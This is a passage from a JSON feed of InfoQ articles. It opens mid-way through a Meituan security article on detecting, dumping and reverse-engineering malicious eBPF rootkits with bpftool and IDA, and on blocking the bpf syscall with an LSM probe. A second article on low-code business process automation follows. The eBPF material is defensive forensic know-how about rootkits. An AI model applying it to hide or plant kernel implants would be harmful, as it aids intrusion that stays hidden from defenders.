hook点。</p><p></p><p>CGROUP的的BPF_PROG_TYPE_CGROUP_SKB、BPF_PROG_TYPE_CGROUP_SOCK类型程序的加载情况都可以通过bpftool prog show查看。长短生命周期的BPF程序区别是缺少用户空间进程PID信息。如下图所示：</p><p><img src=\"https://static001.geekbang.org/infoq/f7/f7ed8d8e3e810cadab3e8e78fb093b0e.jpeg\" /></p><p></p><p>BPFFS</p><p></p><p>除了前面提到的方法外，BPF文件系统BPFFS也是让BPF程序后台运行的方式。用户空间进程可以使用任意名字将BPF程序PIN到BPFFS。让在BPFFS来自动增加BPF对象的refcnt引用计数器，来保持后台的活跃状态。在使用时，只需要使用bpf_obj_get(“BPFFS path”)就可以获得BPF对象的FD。</p><p></p><p>BPFFS在Linux的类型是BPF_FS_MAGIC，默认目录/sys/fs/bpf/，可自定义修改，但确保文件系统类型是unix.BPF_FS_MAGIC。</p><p></p><p>在检测思路上，我们需要关注虚拟文件系统是不是unix.BPF_FS_MAGIC类型。</p><p></p><p>在Linux系统上，mount -t bpf来查看系统所有挂在的文件类型，是否包含BPFFS类型。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/ac/aca85193ebd8cf4025151bcf6be04bd4.jpeg\" /></p><p></p><p>确定BPFFS的目录后，我们再查看目录下的挂载点是否存在异常。</p><p></p><h4>取证</h4><p></p><p></p><p>内核已加载的BPF对象导出</p><p></p><p>bpftool工具可以导出有FD ID的PROG、MAP。&nbsp;BPF PROG程序&nbsp;可以导出opcode\\visual\\linum等多种格式，并可以生成调用关系图。具体可以查看bpftool的帮助文件。</p><p><code lang=\"null\">root@vmubuntu:/home/cfc4n# bpftool prog help\nbpftool prog dump xlated PROG [{ file FILE | opcodes | visual | linum }]\nbpftool prog dump jited  PROG [{ file FILE | opcodes | linum }]</code></p><p></p><p>BPF MAP&nbsp;与PROG类似，也可以通过bpftool导出内容，并支持json格式化内容。</p><p><code lang=\"null\"> root@vmubuntu:/home/cfc4n# bpftool map dump id 20\n[{\n        \"value\": {\n            \".rodata\": [{\n                    \"target_ppid\": 0\n                },{\n                    \"uid\": 0\n                },{\n                    \"payload_len\": 38\n    ...</code></p><p></p><p><img src=\"https://static001.geekbang.org/infoq/46/46775b4b4fc918ceb98a5cc131f60287.jpeg\" /></p><p></p><p>BPFFS类型的BPF对象，虽然可以更便捷的放到后台执行，用户空间程序可以退出，也可以再次读取，但这也给取证带来很大便利。bpftool命令也支持从pinned到BPFFS文件系统的路径里导出prog、map。参数稍有区别，详情见bpftool help。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/a3/a36348f41443f5fcf9a9a5b48b45f534.jpeg\" /></p><p></p><p>内核未加载的BPF对象</p><p></p><p>当定位到后门rootkit的用户空间程序后，那么BPF字节码肯定会被其调用。字节码内容一般会放在一个独立文件中，或者作为字节码编译到当前程序里。这也只需要使用IDA之类反编译工具，定位到相关字节流，导出即可。</p><p></p><p>以本文演示视频中的ehids进程为例，使用<a href=\"https://github.com/ehids/ebpfmanager\">GitHub/ehids/ebpfmanager</a>\"&nbsp;纯Go的eBPF模块管理器package，对于eBPF字节码会使用github.com/shuLhan/go-bindata/cmd/go-bindata包对BPF字节码进行加载、Gzip压缩，作为Go代码的变量，在部署时比较边界。</p><p></p><p>IDA Pro加载时，我们可以在.noptrdata段部分看到这块代码，开始地址是0000000000827AE0，导出后再解压，可以还原原来的BPF ELF文件内容。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/c6/c629686b7c47d266e4ca6c7ef59d709d.jpeg\" /></p><p></p><p>因为每个BPF用户态实现不同，类库也不一样，静态分析实践起来有难度。那可以模拟相同环境，动态运行，提前hook BPF syscall，找到FD设置的地方，也是可以导出BPF的ELF文件。</p><p></p><p>字节码分析</p><p></p><p>BPF字节码本身也是ELF格式，只是格式指令上有一定区别。反编译工具IDA pro也能支持，国外安全工程师开源了一个Python插件：<a href=\"https://github.com/cylance/eBPF_processor\">eBPF IDA Proc</a>\"&nbsp;，并整理了一篇分析的文章：<a href=\"https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool\">Reverse Engineering Ebpfkit Rootkit With BlackBerry's Enhanced IDA Processor Tool</a>\"&nbsp;，感兴趣的同学可以读读。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/7f/7ff805af0d6076c9049a4f06fdcfc393.png\" /></p><p></p><h3>如何防御&nbsp;</h3><p></p><p></p><p>eBPF在网络安全场景的使用，除了做入侵检测外，还可以用于防御。LSM PROBE hook提供了相关功能。以容器逃逸场景为例，行为最明显的特征是“父子进程”的Namespace不一致，子进程创建完成后，判断这个特征是否匹配，返回EPERM覆盖进程创建函数的返回值，从而起到防御的目的。相比内核模块等防御实现，eBPF实现更加安全、稳定、可靠，从而在源头上解决容器逃逸的问题。</p><p></p><p>同样，本文认为eBPF也是二进制层最优秀的虚拟补丁、热更新解决方案。</p><p><img src=\"https://static001.geekbang.org/infoq/4a/4ab1293bf2884c338adc65bb8f4d9865.png\" /></p><p></p><p><code lang=\"null\">LSM_PROBE(bpf, int cmd, union bpf_attr *attr, unsigned int size)\n{\n    return -EPERM;\n}</code></p><p></p><p>在系统的配置上有一定要求，CONFIG_BPF_LSM=y、CONFIG_LSM等配置内容，必须包含bpf等，详情可参考<a href=\"https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#11-lsm-probes\">BCC类库Demo lsm probe</a>\"&nbsp;。</p><p></p><h2>工程实现</h2><p></p><p></p><h3>练手</h3><p></p><p></p><p>入门练手，可以尝试使用BCC的类库：<a href=\"https://github.com/iovisor/bcc\">GitHub/BCC</a>\"&nbsp;，以及C语言用户空间程序的各种Demo例子<a href=\"https://github.com/libbpf/libbpf-bootstrap\">Demo BPF applications</a>\"&nbsp;。</p><p></p><h3>类库选择</h3><p></p><p></p><p>工程化时，对项目质量、稳定性、研发效率等都有要求，推荐Cilium的纯Go eBPF类库，由Cilium官方背书可放心使用。Datadog公司的Agent产品也是用这个类库。</p><p></p><p>本文的产品也是参考Datadog，抽象包装了Cilium的eBPF库，实现配置化便捷管理eBPF程序。GitHub仓库：<a href=\"https://github.com/ehids/ebpfmanager\">ehids/ebpfmanager</a>\"&nbsp;，欢迎大家使用。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/4d/4dbbda4c8b8566893600f1e98071319f.png\" /></p><p></p><p>当然，也可以使用libbpf包装的go类库实现，比如tracee等产品。</p><p></p><h3>系统兼容性 CO-RE</h3><p></p><p></p><p>eBPF的出现极大地简化了编写内核态代码的门槛，极高的安全性，友好的加载方式，高效的数据交互，令eBPF深受追捧。然而和编写传统内核模块相同，内核态的功能开发伴随着繁冗的适配测试工作，Linux繁多的内核版本更是让适配这件事难度陡增，这也就是BTF出现之前的很长一段时间里，bcc + clang + llvm被人们诟病的地方。程序在运行的时候，才进行编译，目标机器还得安装clang llvm kernel-header等编译环境，同时编译也会消耗大量CPU资源，这在某些高负载机器上是不能被接受的。</p><p></p><p>因此，BTF&amp;CO-RE横空出现，BTF可以理解为一种Debug符号描述方式，此前传统方式Debug信息会非常巨大，Linux内核一般会关闭Debug符号，BTF的出现解决了这一问题，大幅度减少Debug信息的大小，使得生产场景内核携带Debug信息成为可能。</p><p></p><p>可喜的是，通过运用BTF&amp;CO-RE这项技术，可以帮助开发者节省大量适配精力，但是这项技术目前还是在开发中，还有许多处理不了的场景，比如结构体成员被迁入子结构体中，这时候还是需要手动解决问题，BTF的开发者也写了一篇文章，讲解不同场景的处理方案<a href=\"https://nakryiko.com/posts/bpf-core-reference-guide/\">bpf-core-reference-guide</a>\"。</p><p></p><h3>大型项目</h3><p></p><p></p><p>在国外，云原生领域产品发展较快，涌现出一批批基于eBPF的产品，包括Cilium、<a href=\"https://www.cnxct.com/how-does-datadog-use-ebpf-in-runtime-security/\">Datadog</a>\"&nbsp;、Falco、Katran等，应用在网络编排、网络防火墙、跟踪定位、运行时安全等各个领域，可以借鉴这些大型项目的研发经验，来加快产品建设，包括多系统兼容、框架设计、项目质量、监控体系建设等。本篇以检测防御为主，工程建设相关经验，我们将在以后的文章中分享。</p><p></p><h2>总结&nbsp;&nbsp;</h2><p></p><p></p><p>随着云原生快速发展，eBPF实现软件、运行环境会越来越多。而eBPF的恶意利用也会越来越普遍。从国内外的情况来看，国外对这个方向的研究远比国内超前，我们再次呼吁大家，网络安全产品应当尽快具备eBPF相关威胁检测能力。</p><p></p><p>本文跟大家探讨了基于eBPF技术的恶意利用与检测机制，其中提到的eBPF在防御检测产品研发、工程建设等内容，我们将在下一篇跟大家分享，敬请期待。</p><p></p><p>作者简介</p><p></p><p>陈驰、杨一、鑫博，均来自美团信息安全部。</p><p></p><p>参考文献：</p><p></p><p><a href=\"https://www.youtube.com/watch?v=g6SKWT7sROQ\">Creating and Countering the Next Generation of Linux Rootkits</a>\"<a href=\"https://www.youtube.com/watch?v=5zixNDolLrg\">DEFCON 29 - eBPF, I thought we were friends</a>\"<a href=\"https://github.com/ehids/slide\">eBPF的各种技术应用PDF集合</a>\"<a href=\"https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/\">Offensive BPF: Malicious bpftrace</a>\"<a href=\"https://blog.tofile.dev/2021/08/01/bad-bpf.html\">Bad BPF - Warping reality using eBPF</a>\"<a href=\"https://facebookmicrosites.github.io/bpf/blog/2018/08/31/object-lifetime.html\">Lifetime of BPF objects</a>\"<a href=\"https://arthurchiao.art/blog/bpf-advanced-notes-1-zh\">BPF程序（BPF Prog）类型详解：使用场景、函数签名、执行位置及程序示例</a>\"<a href=\"https://qmonnet.github.io/whirl-offload/2021/09/23/bpftool-features-thread/\">Features of bpftool: the thread of tips and examples to work with eBPF objects</a>\"<a href=\"https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool\">Reverse Engineering Ebpfkit Rootkit With BlackBerry's Enhanced IDA Processor Tool</a>\"<a href=\"https://image.cnxct.com/2021/12/path-defcon29-ebpf.pdf\">Creating and countering the next generation of Linux rootkits using eBPF</a>\"<a href=\"https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html\">eBPF Syscall</a>\"<a href=\"https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/?=xawxgzh\">Cilium eBPF实现机制源码分析</a>\"<a href=\"https://github.com/Gui774ume/ebpfkit\">ebpfkit is a rootkit powered by eBPF</a>\"</p>",
    "publish_time": "2023-03-16 06:00:00",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "当你的技术栈不能满足每个人需求时，下一步是什么呢？",
    "url": "https://www.infoq.cn/article/7Ps0qyHfQhp59g7YrEvZ",
    "summary": "<p>无论技术发展得有多快，对于一些企业来说，他们往往会感到落后一步。在一个又一个部门，从人力资源和采购到财务和营销，都存在关键软件解决方案不能完全满足其组织需求的情况。对于员工、部门经理，当然还有IT部门来说，这都是一个问题。</p><p>&nbsp;</p><p>对业务敏捷性的贪得无厌，给IT组织选择、集成和部署适当且完整的企业平台带来了巨大压力。然而，通常情况下，技术栈可以做什么和它应该做什么之间是存在差距的。</p><p>&nbsp;</p><p>近十年来推动大多数IT活动的数字转型实际上扩大了部门技术栈的差距。数字化转型通常侧重于大规模实施；它可能会遗漏一些不太可见但却必不可少的工作流和流程，这些工作流和流程将主要平台紧密拼接在了一起。近年来，合格开发人员的短缺更是加剧了这种情况，这使得实现连接良好的解决方案变得更加困难。</p><p>&nbsp;</p><p>因此，业务团队经常使用未完全形成、未被充分解释或不适合当前工作需求的技术。无奈之下，他们使用手动流程或临时软件创建自己的解决方案。</p><p>&nbsp;</p><p>未经批准的影子IT解决方案可能会产生晦涩难懂的过程、不一致的工作流程并缺乏可见性，更不用说安全性和可扩展性问题了。</p><p>&nbsp;</p><p>当公司跟不上变革的步伐时，它们就会失去市场领导者的地位。随着僵化的系统变得过于笨重且修改昂贵，价值转换速度就会下降。混乱的技术环境取代了本应平稳、规范的自动化。</p><p>&nbsp;</p><p></p><h2>可扩展性的挑战</h2><p></p><p></p><p>技术栈可扩展性——可灵活扩展现有技术解决方案的能力——是设计良好的IT生态系统的基本特征。然而，创造这一重要优势并不容易。</p><p>&nbsp;</p><p>垂直解决方案能解决具体的问题，但很僵化；另一方面，水平解决方案虽然更灵活，但修改成本很高。此外，当开发人员忙于企业的其他工作时，定制遗留组件可能是一项挑战。</p><p>&nbsp;</p><p>确实存在其他替代方案。许多组织在应用程序生态系统中购买额外的模块，希望它们能够解决其独特的问题。机器人流程自动化（RPA）是一种选择，虽然可以有效满足特定需求，但需要业务团队自己进行连接，并且仍然会使技术栈变得复杂且缺乏控制。</p><p>&nbsp;</p><p></p><h2>控制结果</h2><p></p><p></p><p>另一方面，低代码BPA（Business Process Automation，业务流程自动化）的优势使其处于技术栈可扩展性方法的最前沿。低代码通过为业务团队提供一套易于使用、易于理解且最重要的是经过IT认可的工具来提高流程弹性。使用这些构建块，最终用户可以用补充和协调现有组件的解决方案方式来缩小差距，而不是与它们竞争或复杂化它们。</p><p>&nbsp;</p><p>低代码方法带来了许多IT优势。它使业务团队能够自己完成大部分工作，从而节省了开发人员的资源并减少了工作积压。它标准化了流程，从而更容易执行安全授权。由于可扩展性内置于低代码框架中，因此补充编码是最少的。</p><p>&nbsp;</p><p>最终用户希望拥有经过IT认可的功能，这些功能使他们能够快速做出更改。他们无需等待定制的解决方案，而是能够随着业务需求的发展进行调整。工作流程变得更相关、更方便、更高效。</p><p>&nbsp;</p><p></p><h2>尝试与测试</h2><p></p><p></p><p>领先的企业已经体验到了低代码支持技术栈可扩展性的优势。全球箱包制造商新秀丽（Samsonite）一直在努力解决其采购工作流程中的几个漏洞。请求是通过电子邮件和文件共享来执行的，部门工作人员必须筛选旧消息，以找到向供应商发起采购报价所需的信息。</p><p>&nbsp;</p><p>低代码BPA解决了这些问题。在对采购流程进行了分析，使其标准化，并确保其符合内部政策和外部法律、财务和税务要求后，新秀丽的采购团队开始创建了每个阶段都必需审批的工作流程。技术栈可扩展性解决方案简化了请求/履约流程，使购买者和请求者能够接收自动通知和警报。</p><p>&nbsp;</p><p>在最初的五个月内，新秀丽减少了大约2370个小时的手工工作，并实现177%的整体投资回报率。</p><p>&nbsp;</p><p></p><blockquote>新秀丽的客户服务和采购经理Mauricio Rizzi表示：“我们的新系统不仅为我们提供了所需的控制，以确保每个人都要遵守我们的规则和政策，而且还为未来的审计创建了一条易于访问的追踪。”</blockquote><p></p><p>&nbsp;</p><p>另一个例子是总部位于伦敦的领先工业车辆制造商CNH。CNH正在处理一个由15个不同系统组成的技术栈，这些系统是在其数字化转型过程中必须实施的。这些系统之间缺乏集成，阻碍了公司人事运营部门的效率，迫使员工通过电子邮件或纸张手动输入、存储和交流信息。</p><p>&nbsp;</p><p>在采用低代码BPA后，人事运营团队能够构建和支持许多改进的流程和体验。与以前更传统的方法相比，该系统赋予了他们更多的所有权和灵活性。</p><p>&nbsp;</p><p></p><blockquote>CNH的服务设计师Diogo Ayres表示：“现在我可以教我们人事运营组织中的任何人如何使用我们的低代码解决方案，他们几乎可以将其用于任何流程。”。“它让我们能够为员工和应聘者提供无缝且一致的体验。”</blockquote><p></p><p>&nbsp;</p><p></p><h2>如何让无代码/低代码为你工作</h2><p></p><p></p><p>公民开发（Citizen development）——当非技术用户能够使用无代码或低代码解决方案来创建新的应用程序而无需编写一行代码时——是提高团队日常效率或简化现有业务流程的有效方式。公民开发人员是优化和扩展组织运营不可或缺的一部分。然而，培养IT团队和公民开发人员之间的共生关系是确保成功并优先考虑高质量产出的关键。</p><p>&nbsp;</p><p>IT需要在整个过程中与公民开发人员合作，以确保最大限度的安全和效率。从一开始，确认团队的整体方法、选择正确的工具、确立角色、设定目标以及讨论公民开发人员何时应向IT部门寻求支持都是非常重要的。为公民开发人员计划指定一名领导是帮助执行这些政策并使团队对达成商定的里程碑负责的一种好方法。</p><p>&nbsp;</p><p>为了鼓励协作并使公民自动化成为日常实践，重要的是必须持续工作，以确定可以自动化的业务流程中的痛点和手动工作。IT部门应定期与业务部门、财务部门和人力资源部门进行沟通，以寻找实现自动化的机会，明确计划出受影响的人会看到什么样的变化。获得其他团队领导的支持是至关重要的，因此公民开发人员和IT部门需要成为自动化优势的内部倡导者。</p><p>&nbsp;</p><p>另一个不可协商的基本规则是，公民开发人员应该只能使用经IT认可的工具平台。这为IT部门提供了监控新应用程序质量和安全性所需的洞察力和能力。IT部门还可以设置“沙箱环境”来降低风险，并允许开发人员在不干扰其他系统的情况下创建应用程序。最终，IT部门负责监控所有公民开发人员的活动和应用程序开发。</p><p>&nbsp;</p><p>为了帮助无代码/低代码解决方案与现有IT基础架构顺利集成，公司应该：</p><p>&nbsp;</p><p>寻找具有支持安全性和合规性工作的功能软件，如SSO、MFA和权限管理。比较软件的正常运行时间和可用性，以最大限度地降低中断风险。确保软件供应商提供了适当的支持，这样IT团队就不会承担不必要的维护工作。在节省IT资源方面，无代码/低代码软件可以帮助公民开发人员并邀请企业用户参与解决问题的过程，这也有助于减少IT的工作积压。最后但同样重要的是，考虑可以跨多个部门处理多个用例的无代码/低代码解决方案。可扩展性和技术栈可扩展性是成本控制策略，当解决方案易于适应并与广泛的应用程序和系统集成时，可提供最大的价值。</p><p>&nbsp;</p><p>投资于正确的无代码/低代码解决方案是第一步，但投资于内部培训和技能开发更为重要。公司需要向公民开发人员提供适当的教育、支持和学习资源。增长并非一蹴而就；IT需要以耐心和团队精神来处理公民发展问题。创建协作学习环境也有助于降低公民开发人员追求影子IT解决方案或犯代价高昂的错误的风险。</p><p>&nbsp;</p><p>公民发展的目的是增强非技术员工的能力，而不是消除IT。虽然公民发展听起来像是对IT部门的威胁，但实际上恰恰相反。公民发展旨在帮助IT专业人员。虽然开始时可能需要一些时间，但当公民开发人员能够自行构建和连接高质量的自动化工作流时，这笔投资就会得到回报。</p><p>&nbsp;</p><p></p><h2>未来预测</h2><p></p><p></p><p>技术栈可扩展性，特别是在低代码BPA启用时，显著提高了典型企业的敏捷性和竞争力。关键应用程序仍然保持相关，实用程序得到了提升，无需定制开发，也无需深入组织的核心（通常是最昂贵的）技术投资。</p><p>&nbsp;</p><p>在这种渐进的方法下，业务用户成为了IT的合作伙伴，遵循相同的策略。开发人员资源总是非常宝贵的，因此得到保护和扩展。利益相关者能够更快地行动，因此每个人的生活都变得更加轻松。</p><p>&nbsp;</p><p>也许永远不会有技术能够充分预测商业需求的时候；然而，灵活、安全和易于使用的连接解决方案可以极大地减少动态环境中的麻烦，并使企业能够满怀信心地向前发展。通过技术栈可扩展性，IT不再需要预测未来。相反，它可以简单地为未来计划。</p><p>&nbsp;</p><p></p><h2>作者介绍</h2><p></p><p></p><p><a href=\"https://www.linkedin.com/in/alessioalionco/\">Alessio Alionço</a>\"是业务流程自动化解决方案Pipify的创始人兼首席执行官。作为一名资深的商业顾问和企业家，Alionço拥有精益六西格玛黑带，并持有斯坦福大学商学院的LEAD证书：个人领导力课程证书。</p><p>&nbsp;</p><p>&nbsp;</p><p>原文链接：</p><p><a href=\"https://www.infoq.com/articles/tech-stack-not-meeting-needs/\">https://www.infoq.com/articles/tech-stack-not-meeting-needs/</a>\"</p><p></p><p>相关阅读：</p><p><a href=\"https://www.infoq.cn/article/g6D7e4ki76V3dRBWkrrK\">基于契约的开发：通过明确需求优化软件开发流程</a>\"</p><p><a href=\"https://www.infoq.cn/article/jpSYVMHY71wO6wchb71x\">架构师角色的演变：从发号施令到与团队合作</a>\"</p>",
    "publish_time": "2023-03-16 08:00:00",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  }
]